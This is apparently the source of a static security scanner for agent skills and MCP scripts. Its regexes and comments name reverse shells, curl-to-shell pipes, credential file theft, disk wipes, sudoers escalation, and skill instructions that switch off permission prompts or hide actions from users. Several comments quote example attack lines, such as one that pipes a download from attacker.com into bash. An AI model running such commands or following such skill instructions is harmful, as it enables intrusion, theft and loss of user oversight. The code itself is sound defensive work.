import { grammarForPath, parseWithLoadedGrammar } from '../parser';
import { isQuotedAttackExample } from '../rules/quotedExample';
import {
    PYTHON_SINKS,
    SCRIPT_SINKS,
    dottedPath,
    hasSyntaxError,
    isStringNode,
    normalizeModule,
    pythonAliases,
    resolve,
    scriptAliases,
    stringValue,
    walk,
} from './codeCapabilities';

/**
 * Behaviour-level threats in scripts that ship with agent skills, MCP servers
 * and prompts. Capability detection alone says a script *can* read files and
 * reach the network; these rules report the combinations that are almost never
 * legitimate in an agent's helper script:
 *
 * - sec_credential_exfiltration: a credential store (~/.ssh, ~/.aws, .npmrc,
 *   .netrc, .git-credentials, docker/kube config, /etc/shadow) is read, or the
 *   whole environment is dumped, in a file that also makes a network call.
 *   Reading one named API key from the environment and calling an API is the
 *   normal client pattern and is not reported.
 * - sec_remote_code_execution: code downloaded at runtime is executed
 *   (exec/eval/new Function of a network response, or a download piped into
 *   a shell).
 *
 * Detection resolves import aliases, __import__/getattr indirection and
 * string building ("." + "aw" + "s", ["ht", "tps"].join("")), because those are
 * how this kind of payload hides from keyword scanners. It stays deterministic:
 * no execution, no network, no LLM.
 */

export type CodeThreatRuleId =
    | 'sec_credential_exfiltration'
    | 'sec_remote_code_execution'
    | 'sec_destructive_command'
    | 'sec_approval_bypass'
    | 'sec_user_concealment'
    | 'sec_wildcard_tool_permission'
    | 'sec_unpinned_remote_install'
    | 'sec_privilege_escalation';

export const CODE_THREAT_RULE_IDS: ReadonlySet<string> = new Set<CodeThreatRuleId>([
    'sec_credential_exfiltration',
    'sec_remote_code_execution',
    'sec_destructive_command',
    'sec_approval_bypass',
    'sec_user_concealment',
    'sec_wildcard_tool_permission',
    'sec_unpinned_remote_install',
    'sec_privilege_escalation',
]);

/** What to do about each script threat; shared by the CLI, Action and dashboard. */
export const CODE_THREAT_REMEDIATION: Record<CodeThreatRuleId, string> = {
    sec_credential_exfiltration: 'Remove the credential read or the upload. A helper script should read only the one key it needs, from an environment variable, and send it only to that service.',
    sec_remote_code_execution: 'Do not execute downloaded code or pipe a download into a shell. Install a pinned, checksummed package from a registry instead.',
    sec_destructive_command: 'Limit deletes to paths inside the project (./dist, ./build) and never target the home directory, the filesystem root or a disk device.',
    sec_approval_bypass: 'Remove the instruction. Permission prompts are the user\'s control; a skill or prompt must never switch them off.',
    sec_user_concealment: 'Remove the instruction. An agent must tell the user what it does; instructions that hide actions are a hallmark of malicious skills.',
    sec_wildcard_tool_permission: 'List the specific tools and commands the skill needs, e.g. allowed-tools: Bash(npm run test), Read.',
    sec_unpinned_remote_install: 'Pin an exact version or commit (pkg@1.4.2, git+https://...@<commit-sha>) and prefer a lockfile with hashes.',
    sec_privilege_escalation: 'Remove the change. Grant sudo for one named command if it is really needed, and give files the narrowest permissions that work (e.g. chmod 600 for keys, 755 for scripts).',
};

export const CODE_THREAT_RISK: Record<CodeThreatRuleId, string> = {
    sec_credential_exfiltration: 'An agent that runs this script sends SSH keys, cloud credentials, tokens or the whole environment to a remote host.',
    sec_remote_code_execution: "Code fetched at run time executes with the agent's permissions; whoever controls the URL controls the machine.",
    sec_destructive_command: 'An agent that follows this instruction deletes the user\'s files or makes the machine unusable.',
    sec_approval_bypass: 'Turning off permission prompts lets every later tool call, including injected ones, run without the user seeing it.',
    sec_user_concealment: 'Hiding actions from the user removes the only person who could notice and stop a harmful one.',
    sec_wildcard_tool_permission: 'A wildcard grants the skill every tool, so one injected instruction can run any command.',
    sec_unpinned_remote_install: 'A branch or @latest reference installs whatever the publisher pushes next, without review.',
    sec_privilege_escalation: 'Passwordless sudo for everything, a world-writable home or system directory, or a setuid shell lets any process, including an injected one, take over the machine.',
};

export interface CodeThreat {
    ruleId: CodeThreatRuleId;
    severity: 'critical' | 'high' | 'medium';
    line: number;
    column: number;
    message: string;
    /** The source (what is read) and the sink (where it goes), as resolved. */
    source: string;
    sink: string;
    /** The command is quoted as an example of an attack (see rules/quotedExample); severity lowered to MEDIUM. */
    quotedExample?: boolean;
}

// Credential stores whose presence in a file that also talks to the network is
// the exfiltration signal. Matched against every constant string in the file,
// after folding string concatenation.
const CREDENTIAL_PATH = /(?:^|[\\/~])\.(?:ssh|aws|gnupg|kube|docker)(?:[\\/]|$)|^\.(?:ssh|aws|gnupg)$|\bid_(?:rsa|dsa|ecdsa|ed25519)\b|(?:^|[\\/])\.(?:npmrc|netrc|pypirc|git-credentials)$|aws[\\/]credentials|\.docker[\\/]config\.json|\.kube[\\/]config|\/etc\/(?:shadow|passwd)\b|(?:^|[\\/])(?:Login Data|Cookies|wallet\.dat)$/;

// Also the command-substitution forms: sh -c "$(curl URL)" and bash <(curl URL).
// A download needs a target: a URL, IP, domain or variable before the pipe
// ("curl ... | bash" as a placeholder in a reviewer's checklist is not one).
const DOWNLOAD_TO_SHELL = /\b(?:curl|wget)\b[^|\n;]*?(?:https?:\/\/|\b\d{1,3}(?:\.\d{1,3}){3}\b|\b[\w-]+\.[a-z]{2,}\b|\$\{?\w+)[^|\n;]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b|\bbase64\s+(?:-d|-D|--decode)\b[^|\n]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b|\b(?:ba|z|da|k)?sh\s+(?:-\w+\s+)*-c\s+["']?\$\(\s*(?:curl|wget)\b[^)\n]*(?:https?:\/\/|\b\d{1,3}(?:\.\d{1,3}){3}\b)|\b(?:(?:ba|z|da|k)?sh|source|\.)\s+<\(\s*(?:curl|wget)\b[^)\n]*(?:https?:\/\/|\b\d{1,3}(?:\.\d{1,3}){3}\b)/;
const REVERSE_SHELL = /\b(?:ba)?sh\s+-i\s*>&?\s*\/dev\/tcp\/|\bnc\b[^\n]*\s-e\s+\/bin\/(?:ba)?sh/;
// Wipes the home directory or the root filesystem, formats a disk, or forks
// the machine to death. Project-relative deletes (rm -rf ./dist) are not matched.
const DESTRUCTIVE = /\brm\s+(?:-[a-zA-Z]*[rR][a-zA-Z]*\s+|-[a-zA-Z]+\s+-[a-zA-Z]+\s+|--recursive\s+|--force\s+)+(?:--no-preserve-root\s+)?(?:~\/?|\/\*?|\$HOME\/?|"\$HOME"\/?|\/(?:home|root|etc|usr|var)\/?)(?=\s|$|;|&|\||`|'|"|\))|--no-preserve-root\b|\bmkfs(?:\.\w+)?\s+\/dev\/|\bdd\s+[^\n]*\bof=\/dev\/(?:sd|nvme|hd|disk|xvd)|:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/;

// PowerShell: a download piped into, or wrapped by, Invoke-Expression.
const POWERSHELL_DOWNLOAD_EXEC = /\b(?:iwr|irm|invoke-webrequest|invoke-restmethod|curl|wget)\b[^|\n]*\|\s*(?:iex|invoke-expression)\b|\b(?:iex|invoke-expression)\s*\(*\s*(?:new-object\s+(?:system\.)?net\.webclient|iwr\b|irm\b|invoke-webrequest\b|invoke-restmethod\b)/i;
// Passwordless sudo for every command written into sudoers; a world-writable
// home, root or system directory; a setuid shell.
const SUDOERS_NOPASSWD_ALL = /NOPASSWD\s*:\s*ALL\b[^\n]*(?:\btee\b|>>?\s*\/etc\/sudoers|\/etc\/sudoers)|(?:\btee\b|>>?)[^\n]*\/etc\/sudoers[^\n]*NOPASSWD\s*:\s*ALL\b|\becho\b[^\n]*NOPASSWD\s*:\s*ALL\b[^\n]*\|/;
const WORLD_WRITABLE_ROOT = /\bchmod\s+(?:-[a-zA-Z]*\s+)*(?:0?777|a\+rwx|ugo\+rwx|o\+w)\s+(?:~\/?|\/\*?|\$HOME\/?|"\$HOME"\/?|\/(?:etc|usr|bin|home|root|var)\/?)(?=\s|$|;|&|\||`|'|"|\))/;
const SETUID_SHELL = /\bchmod\s+(?:u\+s|[+]s|[2-7]7[0-7]{2})\s+\/(?:usr\/)?bin\/(?:ba|z|da)?sh\b/;
// Data a command sends: options that authenticate (-i key, --cert, --netrc-file)
// or name the download target (-o, -O) are removed before looking for a
// credential, so "rsync -e 'ssh -i ~/.ssh/deploy'" and "wget -O ~/.ssh/known_hosts" are not uploads.
const NON_PAYLOAD_OPTION = /\s(?:-i|-e|-E|-K|-o|-O|-\w*[oO]|--(?:cert|key|cacert|capath|netrc-file|config|output|output-document|identity|rsh))(?:\s+|=)(?:"[^"]*"|'[^']*'|\S+)/g;
const UPLOAD_COMMAND = /\b(?:curl|wget|nc|ncat|scp|rsync|ftp|sftp)\b/;
const SHELL_NETWORK = /\b(?:curl|wget|nc|ncat|nslookup|dig|scp|rsync|ftp)\b/;

const SHELL_EXTENSIONS = new Set(['.sh', '.bash', '.zsh']);
const INSTRUCTION_EXTENSIONS = new Set(['.md', '.mdx', '.prompt', '.ai', '.chat', '.txt', '.yml', '.yaml']);

function extensionOf(filePath: string): string {
    const match = /\.[^./\\]+$/.exec(filePath);
    return match ? match[0].toLowerCase() : '';
}

/** Constant value of a string expression, folding concatenation and joins. */
function constantString(node: any): string | undefined {
    if (!node) return undefined;
    if (isStringNode(node)) {
        if (node.type === 'template_string' && (node.namedChildren || []).some((c: any) => c.type === 'template_substitution')) {
            return undefined;
        }
        return stringValue(node);
    }
    if (node.type === 'parenthesized_expression') return constantString(node.namedChildren[0]);
    if (node.type === 'concatenated_string') {
        const parts = node.namedChildren.map(constantString);
        return parts.every((part: string | undefined) => part !== undefined) ? parts.join('') : undefined;
    }
    if (node.type === 'binary_expression' || node.type === 'binary_operator') {
        const operator = node.childForFieldName('operator')?.text;
        if (operator !== '+') return undefined;
        const left = constantString(node.childForFieldName('left'));
        const right = constantString(node.childForFieldName('right'));
        return left !== undefined && right !== undefined ? left + right : undefined;
    }
    if (node.type === 'call_expression' || node.type === 'call') {
        // JS: ["a", "b"].join("")   Python: "".join(["a", "b"])
        const fn = node.childForFieldName('function');
        const args = node.childForFieldName('arguments')?.namedChildren || [];
        const property = fn?.childForFieldName(fn.type === 'attribute' ? 'attribute' : 'property');
        if (!fn || property?.text !== 'join') return undefined;
        const receiver = fn.childForFieldName('object');
        const list = fn.type === 'attribute' ? args[0] : receiver;
        const separator = fn.type === 'attribute' ? constantString(receiver) : (args[0] ? constantString(args[0]) : ',');
        if (separator === undefined || !list || !['array', 'list', 'tuple'].includes(list.type)) return undefined;
        const parts = list.namedChildren.map(constantString);
        return parts.every((part: string | undefined) => part !== undefined) ? parts.join(separator) : undefined;
    }
    return undefined;
}

function position(node: any): { line: number; column: number } {
    return { line: node.startPosition.row + 1, column: node.startPosition.column + 1 };
}

// Calls that turn the whole environment into data that can be sent.
const PYTHON_SERIALIZERS = new Set(['json.dumps', 'str', 'repr', 'pickle.dumps', 'yaml.dump', 'yaml.safe_dump', 'urllib.parse.urlencode', 'base64.b64encode']);
const SCRIPT_SERIALIZERS = new Set(['JSON.stringify', 'Object.entries', 'Object.keys', 'Object.values', 'String', 'Buffer.from', 'btoa', 'querystring.stringify', 'URLSearchParams']);

/**
 * True when `node` is (inside) an argument of a call matching `isTarget`,
 * within the same statement: JSON.stringify(process.env), json.dumps(dict(os.environ)).
 * Saving the environment in a variable for later use is not a dump.
 */
function flowsIntoCall(node: any, isTarget: (call: any) => boolean): boolean {
    for (let current = node.parent; current; current = current.parent) {
        if (/statement|declaration|definition|^program$|^module$|^block$/.test(current.type) && !/expression/.test(current.type)) return false;
        if ((current.type === 'call' || current.type === 'call_expression' || current.type === 'new_expression') && isTarget(current)) return true;
    }
    return false;
}

function hasDescendant(node: any, predicate: (node: any) => boolean): boolean {
    let found = false;
    walk(node, child => { if (!found && child !== node && predicate(child)) found = true; });
    return found;
}

interface FileFacts {
    credentialSources: Array<{ text: string; node: any }>;
    envDump?: { text: string; node: any };
    networkCalls: Array<{ callee: string; node: any }>;
    threats: CodeThreat[];
}

function exfiltrationThreat(facts: FileFacts): CodeThreat | undefined {
    const source = facts.credentialSources[0] || facts.envDump;
    const sink = facts.networkCalls[0];
    if (!source || !sink) return undefined;
    return {
        ruleId: 'sec_credential_exfiltration',
        severity: 'critical',
        ...position(sink.node),
        source: source.text,
        sink: sink.callee,
        message: `Reads ${source.text} and sends data over the network (${sink.callee}) in the same file. Credentials or the whole environment can leave the machine.`,
    };
}

/** Adds the file-level credential-to-network finding unless a command already reported one. */
function withFileLevelExfiltration(facts: FileFacts): CodeThreat[] {
    if (facts.threats.some(threat => threat.ruleId === 'sec_credential_exfiltration')) return facts.threats;
    const exfil = exfiltrationThreat(facts);
    return exfil ? [...facts.threats, exfil] : facts.threats;
}

/**
 * Names assigned from an expression that makes a network call
 * (p = await fetch(url).then(r => r.text()), r = requests.get(url)), so
 * eval(atob(p)) / exec(r.text) are seen as executing the download.
 */
function namesAssignedFromNetwork(root: any, isNetworkCall: (node: any) => boolean): Set<string> {
    const names = new Set<string>();
    walk(root, node => {
        let left: any;
        let right: any;
        if (node.type === 'variable_declarator') {
            left = node.childForFieldName('name');
            right = node.childForFieldName('value');
        } else if (node.type === 'assignment' || node.type === 'assignment_expression') {
            left = node.childForFieldName('left');
            right = node.childForFieldName('right');
        }
        if (left?.type === 'identifier' && right && (isNetworkCall(right) || hasDescendant(right, isNetworkCall))) names.add(left.text);
    });
    return names;
}

function usesDownloadedValue(args: any, downloaded: Set<string>, isNetworkCall: (node: any) => boolean): boolean {
    return hasDescendant(args, child => isNetworkCall(child) || (child.type === 'identifier' && downloaded.has(child.text)));
}

// --- Python -----------------------------------------------------------------

/** Resolve a Python callee, following __import__("m") and getattr(x, "name"). */
function pythonCallee(node: any, aliases: Map<string, string>): string | undefined {
    if (!node) return undefined;
    if (node.type === 'call') {
        const fn = node.childForFieldName('function');
        const args = node.childForFieldName('arguments')?.namedChildren || [];
        if (fn?.text === '__import__' && args[0]) {
            const name = constantString(args[0]);
            return name ? normalizeModule(name) : undefined;
        }
        if (fn?.text === 'getattr' && args.length >= 2) {
            const base = pythonCallee(args[0], aliases);
            const attribute = constantString(args[1]);
            return base && attribute ? `${base}.${attribute}` : undefined;
        }
        return undefined;
    }
    if (node.type === 'attribute') {
        const object = pythonCallee(node.childForFieldName('object'), aliases);
        const attribute = node.childForFieldName('attribute')?.text;
        return object && attribute ? `${object}.${attribute}` : undefined;
    }
    const path = dottedPath(node);
    return path ? resolve(path, aliases) : undefined;
}

function pythonDynamicAliases(root: any, aliases: Map<string, string>): void {
    // m = __import__("urllib.request")   o = getattr(__import__("os"), "path")
    walk(root, node => {
        if (node.type !== 'assignment') return;
        const left = node.childForFieldName('left');
        const right = node.childForFieldName('right');
        if (left?.type !== 'identifier' || right?.type !== 'call') return;
        const target = pythonCallee(right, aliases);
        if (target) aliases.set(left.text, target);
    });
}

const PYTHON_NETWORK = PYTHON_SINKS.network;
const PYTHON_EXEC = new Set(['exec', 'eval', 'compile', 'builtins.exec', 'builtins.eval']);
const PYTHON_SHELL = PYTHON_SINKS.shell;

function isPythonNetworkCall(node: any, aliases: Map<string, string>): boolean {
    if (node.type !== 'call') return false;
    const callee = pythonCallee(node.childForFieldName('function'), aliases);
    return Boolean(callee && (PYTHON_NETWORK.has(callee) || /^(?:requests|httpx)\.\w+$/.test(callee)));
}

function analyzePythonThreats(root: any): CodeThreat[] {
    const aliases = pythonAliases(root);
    pythonDynamicAliases(root, aliases);
    const facts: FileFacts = { credentialSources: [], networkCalls: [], threats: [] };
    const downloaded = namesAssignedFromNetwork(root, node => isPythonNetworkCall(node, aliases));

    walk(root, node => {
        const constant = (isStringNode(node) || node.type === 'binary_operator' || node.type === 'call' || node.type === 'concatenated_string')
            ? constantString(node)
            : undefined;
        if (constant && CREDENTIAL_PATH.test(constant)) facts.credentialSources.push({ text: constant, node });

        if (node.type === 'attribute' || node.type === 'identifier') {
            // The whole environment as a value: dict(os.environ), json.dumps(os.environ), os.environ.copy()
            const parent = node.parent;
            // Only when it goes straight into serialisation or a network call;
            // saving it (env = dict(os.environ)) or passing it to a child
            // process (env=os.environ) is ordinary.
            if (pythonCallee(node, aliases) === 'os.environ' && parent?.type !== 'subscript'
                && parent?.type !== 'keyword_argument' && parent?.type !== 'dictionary_splat'
                && !(parent?.type === 'attribute' && ['get', 'setdefault', 'pop'].includes(parent.childForFieldName('attribute')?.text))
                && !(node.type === 'identifier' && parent?.type === 'attribute')
                && flowsIntoCall(node, call => {
                    const callee = pythonCallee(call.childForFieldName('function'), aliases);
                    return Boolean(callee && (PYTHON_SERIALIZERS.has(callee) || isPythonNetworkCall(call, aliases)));
                })) {
                facts.envDump = facts.envDump || { text: 'the whole environment (os.environ)', node };
            }
        }

        if (node.type !== 'call') return;
        const callee = pythonCallee(node.childForFieldName('function'), aliases);
        if (!callee) return;
        if (isPythonNetworkCall(node, aliases)) facts.networkCalls.push({ callee, node });

        const args = node.childForFieldName('arguments');
        if (PYTHON_EXEC.has(callee) && args && usesDownloadedValue(args, downloaded, child => isPythonNetworkCall(child, aliases))) {
            facts.threats.push({
                ruleId: 'sec_remote_code_execution', severity: 'critical', ...position(node),
                source: 'a network download', sink: callee,
                message: `Executes code downloaded at runtime (${callee} of a network response). Whoever controls that URL controls this machine.`,
            });
        }
        if (PYTHON_SHELL.has(callee) && args) {
            const command = constantString(args.namedChildren[0]);
            if (command) facts.threats.push(...commandLineThreats(command, position(node).line).map(threat => ({ ...threat, column: position(node).column, sink: callee })));
        }
    });

    return withFileLevelExfiltration(facts);
}

// --- JavaScript / TypeScript --------------------------------------------------

const SCRIPT_NETWORK = SCRIPT_SINKS.network;
const SCRIPT_SHELL = SCRIPT_SINKS.shell;

function scriptCallee(node: any, aliases: Map<string, string>): string | undefined {
    const path = dottedPath(node);
    return path ? resolve(path, aliases) : undefined;
}

function isScriptNetworkCall(node: any, aliases: Map<string, string>): boolean {
    if (node.type !== 'call_expression' && node.type !== 'new_expression') return false;
    const callee = scriptCallee(node.childForFieldName(node.type === 'call_expression' ? 'function' : 'constructor'), aliases);
    return Boolean(callee && SCRIPT_NETWORK.has(callee));
}

function analyzeScriptThreats(root: any): CodeThreat[] {
    const aliases = scriptAliases(root);
    const facts: FileFacts = { credentialSources: [], networkCalls: [], threats: [] };
    const downloaded = namesAssignedFromNetwork(root, node => isScriptNetworkCall(node, aliases));

    walk(root, node => {
        const constant = ['string', 'template_string', 'binary_expression', 'call_expression'].includes(node.type)
            ? constantString(node)
            : undefined;
        if (constant && CREDENTIAL_PATH.test(constant)) facts.credentialSources.push({ text: constant, node });

        if (node.type === 'member_expression' && dottedPath(node) === 'process.env') {
            // The whole environment as a value, e.g. JSON.stringify(process.env)
            const parent = node.parent;
            const accessed = (parent?.type === 'member_expression' || parent?.type === 'subscript_expression')
                && parent.childForFieldName('object')?.id === node.id;
            // Passing it on to a child process ({ env: process.env }, {...process.env}) is not a dump.
            const passedOn = parent?.type === 'spread_element'
                || (parent?.type === 'pair' && parent.childForFieldName('key')?.text === 'env');
            const serialized = flowsIntoCall(node, call => {
                const callee = scriptCallee(call.childForFieldName(call.type === 'call_expression' ? 'function' : 'constructor'), aliases);
                return Boolean(callee && (SCRIPT_SERIALIZERS.has(callee) || isScriptNetworkCall(call, aliases)));
            });
            if (!accessed && !passedOn && serialized) facts.envDump = facts.envDump || { text: 'the whole environment (process.env)', node };
        }

        if (node.type !== 'call_expression' && node.type !== 'new_expression') return;
        const callee = scriptCallee(node.childForFieldName(node.type === 'call_expression' ? 'function' : 'constructor'), aliases);
        if (!callee) return;
        if (isScriptNetworkCall(node, aliases)) facts.networkCalls.push({ callee, node });

        const args = node.childForFieldName('arguments');
        if ((callee === 'eval' || callee === 'Function') && args && usesDownloadedValue(args, downloaded, child => isScriptNetworkCall(child, aliases))) {
            facts.threats.push({
                ruleId: 'sec_remote_code_execution', severity: 'critical', ...position(node),
                source: 'a network download', sink: callee,
                message: `Executes code downloaded at runtime (${callee} of a network response). Whoever controls that URL controls this machine.`,
            });
        }
        if (SCRIPT_SHELL.has(callee) && args) {
            const command = constantString(args.namedChildren[0]);
            if (command) facts.threats.push(...commandLineThreats(command, position(node).line).map(threat => ({ ...threat, column: position(node).column, sink: callee })));
        }
    });

    return withFileLevelExfiltration(facts);
}

// --- Shell scripts --------------------------------------------------------------

function escapeRegExp(text: string): string {
    return text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/** `curl -o f URL && sh f`, `wget -qO f URL; chmod +x f; ./f`: the downloaded file is then run. */
function downloadsThenRuns(line: string): boolean {
    const download = /\b(?:curl|wget)\b[^\n]*?\s(?:-\w*[oO]|--output(?:-document)?)(?:\s+|=)["']?([^\s"';&|]+)/.exec(line);
    if (!download || !/https?:\/\/|\$\{?\w+/.test(line)) return false;
    const file = escapeRegExp(download[1]);
    const rest = line.slice(download.index + download[0].length);
    return new RegExp(String.raw`(?:&&|;|\|\|)\s*(?:sudo\s+)?(?:(?:(?:ba|z|da|k)?sh|source|\.|python3?|node|perl|ruby)\s+["']?${file}\b|(?:\.\/)?${file}(?=\s|$|;|&))`).test(rest);
}

/** The credential a command sends (cat ~/.npmrc | curl -d @-, scp ~/.ssh host:), if any. */
function commandCredentialUpload(line: string): string | undefined {
    const payload = line.replace(NON_PAYLOAD_OPTION, ' ');
    if (!UPLOAD_COMMAND.test(payload)) return undefined;
    return payload.split(/\s+/).find(raw => {
        const token = raw.replace(/^[@"'$({<]+|["')}>;,]+$/g, '');
        // host:~/.ssh/... is a remote path (copied from, not to), and a .pub key is public.
        return !/\.pub$/.test(token) && !/^[^/~]*:/.test(token) && CREDENTIAL_PATH.test(token);
    });
}

/**
 * Command-level threats on one line of a script or of instructions an agent
 * will follow. In instructions an https installer piped into a shell (a
 * vendor's documented `curl … | sh`) is HIGH, for review; a raw IP, decoded
 * payload or reverse shell is CRITICAL everywhere.
 */
// A base64 run long enough to hold a command.
const BASE64_RUN = /[A-Za-z0-9+/]{24,}={0,2}/g;
// What a hidden command looks like once decoded: a shell, a download, PowerShell.
const DECODED_COMMAND = /\b(?:curl|wget)\b[^\n]*(?:https?:\/\/|\b\d{1,3}(?:\.\d{1,3}){3}\b)|\b(?:ba|z)?sh\s+-c\b|\/bin\/(?:ba|z)?sh\b|\bpowershell\b|\binvoke-expression\b|\biex\b|\bnc\s+-e\b/i;

/** The decoded text of base64 runs on a line that decode to a command, if any. */
function decodedCommand(line: string): string | undefined {
    for (const run of line.match(BASE64_RUN) || []) {
        let decoded: string;
        try {
            decoded = Buffer.from(run, 'base64').toString('utf8');
        } catch {
            continue;
        }
        if (/^[\x09\x0A\x0D\x20-\x7E]+$/.test(decoded) && DECODED_COMMAND.test(decoded)) return decoded;
    }
    return undefined;
}

function commandLineThreats(line: string, lineNumber: number, context: 'script' | 'instruction' = 'script'): CodeThreat[] {
    const threats: CodeThreat[] = [];
    // A command hidden in base64 ("echo 'L2Jpbi9i…' | base64 -D | bash"): the
    // ClawHavoc skills told users to paste exactly this into Terminal.
    const hidden = decodedCommand(line);
    if (hidden) {
        threats.push({
            ruleId: 'sec_remote_code_execution', severity: 'critical', line: lineNumber, column: 1,
            source: 'a base64-encoded command', sink: 'shell',
            message: `Hides a command in base64 (decodes to: ${hidden.trim().slice(0, 120)}).`,
        });
    }
    const download = DOWNLOAD_TO_SHELL.test(line) || POWERSHELL_DOWNLOAD_EXEC.test(line) || downloadsThenRuns(line);
    if (download || REVERSE_SHELL.test(line)) {
        const unmistakable = REVERSE_SHELL.test(line) || /\bbase64\s+(?:-d|--decode)\b/.test(line) || /\b\d{1,3}(?:\.\d{1,3}){3}\b/.test(line);
        threats.push({
            ruleId: 'sec_remote_code_execution', severity: context === 'instruction' && !unmistakable ? 'high' : 'critical', line: lineNumber, column: 1,
            source: 'a remote download or shell', sink: 'shell',
            message: 'Runs downloaded or decoded content as code (piped into a shell, Invoke-Expression, or saved and executed), or opens a remote shell.',
        });
    }
    const uploaded = commandCredentialUpload(line);
    if (uploaded) {
        threats.push({
            ruleId: 'sec_credential_exfiltration', severity: 'critical', line: lineNumber, column: 1,
            source: uploaded, sink: UPLOAD_COMMAND.exec(line.replace(NON_PAYLOAD_OPTION, ' '))?.[0] || 'network',
            message: `Sends ${uploaded} over the network in a single command.`,
        });
    }
    if (SUDOERS_NOPASSWD_ALL.test(line) || WORLD_WRITABLE_ROOT.test(line) || SETUID_SHELL.test(line)) {
        threats.push({
            ruleId: 'sec_privilege_escalation', severity: 'critical', line: lineNumber, column: 1,
            source: 'a permission change', sink: 'the system',
            message: 'Grants passwordless sudo for every command, makes a home or system directory world-writable, or creates a setuid shell.',
        });
    }
    if (DESTRUCTIVE.test(line)) {
        threats.push({
            ruleId: 'sec_destructive_command', severity: 'critical', line: lineNumber, column: 1,
            source: 'a destructive command', sink: 'shell',
            message: 'Deletes the home directory or root filesystem, formats a disk, or exhausts the machine.',
        });
    }
    return threats;
}

/**
 * Prompts, skills and agent instructions (Markdown, .prompt, text, YAML): a
 * command written there is one the agent is told to run. Only command-level
 * threats are checked; prose mentions of credentials and URLs are not.
 */
function analyzeInstructionThreats(content: string): CodeThreat[] {
    const threats: CodeThreat[] = [];
    const lines = content.split(/\r?\n/);
    // "Never run its curl | sh lines" is a prohibition, not an instruction.
    lines.forEach((line, index) => {
        const command = line.split(/(?<=[.!?])\s+/).filter(sentence => !PROHIBITION.test(sentence)).join(' ');
        const found = commandLineThreats(command, index + 1, 'instruction');
        // `curl attacker.com/x | bash` in a cron-persistence write-up, `; rm -rf /`
        // as a filename payload: described attacks, kept as MEDIUM.
        threats.push(...(found.length && isQuotedAttackExample(lines, index)
            ? found.map(threat => ({ ...threat, severity: 'medium' as const, quotedExample: true }))
            : found));
    });
    threats.push(...deliveryThreats(lines));
    const lineOf = (offset: number) => content.slice(0, offset).split(/\r?\n/).length;

    // allowed-tools: "*" (or Bash(*)) grants every tool.
    const wildcard = /^allowed-tools:\s*(?:\[\s*)?["']?(?:\*|Bash\(\s*\*\s*\))["']?/im.exec(content);
    if (wildcard) {
        threats.push({
            ruleId: 'sec_wildcard_tool_permission', severity: 'high', line: lineOf(wildcard.index), column: 1,
            source: 'allowed-tools', sink: 'every tool',
            message: 'Grants the skill every tool (allowed-tools wildcard), including unrestricted shell.',
        });
    }

    // Branch / @latest references install whatever is published next.
    lines.forEach((line, index) => {
        const unpinned = unpinnedRemoteInstall(line);
        if (unpinned) {
            threats.push({
                // A git branch is HIGH; a registry @latest (often the documented
                // install, e.g. npx shadcn@latest) is a MEDIUM hygiene issue.
                ruleId: 'sec_unpinned_remote_install', severity: unpinned, line: index + 1, column: 1,
                source: 'an unpinned package or branch', sink: 'install',
                message: 'Installs from a moving reference (a git branch or @latest), so the code that runs can change without review.',
            });
        }
    });

    const concealment = firstUnnegatedMatch(content, USER_CONCEALMENT) || concealedAction(content);
    const bypass = APPROVAL_BYPASS.exec(content);
    if (bypass) {
        // "Only inside a disposable container" is advice, not an attack.
        const bypassLine = lines[lineOf(bypass.index) - 1] || '';
        const sandboxed = /\b(?:container|sandbox(?:ed)?|devcontainer|docker|vm|virtual\s+machine|isolated)\b/i.test(bypassLine);
        // A settings table (a migration mapping), a line that says not to use it
        // ("Preserve the user's permission settings"), or a quoted example
        // documents the switch; it does not throw it.
        const documented = /^\s*\|.*\|.*\|/.test(bypassLine)
            || PROHIBITION.test(bypassLine) || /\b(?:preserve|respect|keep)\s+the\s+user'?s?\s+permission/i.test(bypassLine)
            || isQuotedAttackExample(lines, lineOf(bypass.index) - 1);
        threats.push({
            ruleId: 'sec_approval_bypass', severity: concealment ? 'critical' : sandboxed || documented ? 'medium' : 'high', line: lineOf(bypass.index), column: 1,
            source: bypass[0], sink: 'permission prompts',
            message: `Tells the agent to switch off permission prompts (${bypass[0].trim()})${concealment ? ' and to hide it from the user' : ''}.`,
        });
    }
    if (concealment) {
        threats.push({
            ruleId: 'sec_user_concealment', severity: 'high', line: lineOf(concealment.index), column: 1,
            source: concealment.text, sink: 'the user',
            message: `Tells the agent to hide what it does from the user ("${concealment.text.trim()}").`,
        });
    }

    // Prose that tells the agent to send a credential somewhere.
    const exfil = proseCredentialExfiltration(content);
    if (exfil) threats.push({ ...exfil, line: lineOf(exfil.offset), column: 1 } as CodeThreat);

    return threats;
}

// Malware delivery used by real malicious skills (ClawHavoc, 2026): a
// "prerequisite" archive or executable with an extraction password (which
// defeats antivirus scanning of the archive), or a command to copy from a paste
// site into a terminal (unreviewed, and changeable after publication).
const ARCHIVE_LINK = /https?:\/\/\S+?\.(?:zip|7z|rar|exe|msi|dmg|pkg|appimage)\b/i;
const ARCHIVE_PASSWORD = /\b(?:extract|unzip|unpack|decompress|open)\w*\b[^\n]{0,40}?\b(?:password|passphrase|using)\b|\b(?:archive|zip)\s+password\b|\bpassword\s*[:=]\s*`?[\w-]{3,}/i;
const PASTE_SITE = /\b(?:glot\.io|pastebin\.com|rentry\.(?:co|org)|hastebin\.\w+|paste\.ee|controlc\.com|termbin\.com|ghostbin\.\w+|privatebin\.\w+|dpaste\.\w+|ix\.io|sprunge\.us)\b/i;
const RUN_IN_TERMINAL = /\b(?:run|execute|paste|copy|enter)\b[^\n]{0,80}\b(?:terminal|command\s+prompt|powershell|shell|console)\b|\b(?:terminal|powershell)\b[^\n]{0,40}\b(?:run|execute|paste)\b/i;

function deliveryThreats(lines: string[]): CodeThreat[] {
    const threats: CodeThreat[] = [];
    lines.forEach((line, index) => {
        const window = lines.slice(Math.max(0, index - 3), index + 7).join('\n');
        let message: string | undefined;
        if (ARCHIVE_LINK.test(line) && ARCHIVE_PASSWORD.test(window)) {
            message = 'Tells the reader to download an archive or executable and extract it with a password, which hides its contents from antivirus scanning.';
        } else if (PASTE_SITE.test(line) && RUN_IN_TERMINAL.test(window)) {
            message = 'Tells the reader to run a command taken from a paste site, which nobody reviews and which can change after publication.';
        }
        if (!message) return;
        const quoted = isQuotedAttackExample(lines, index);
        threats.push({
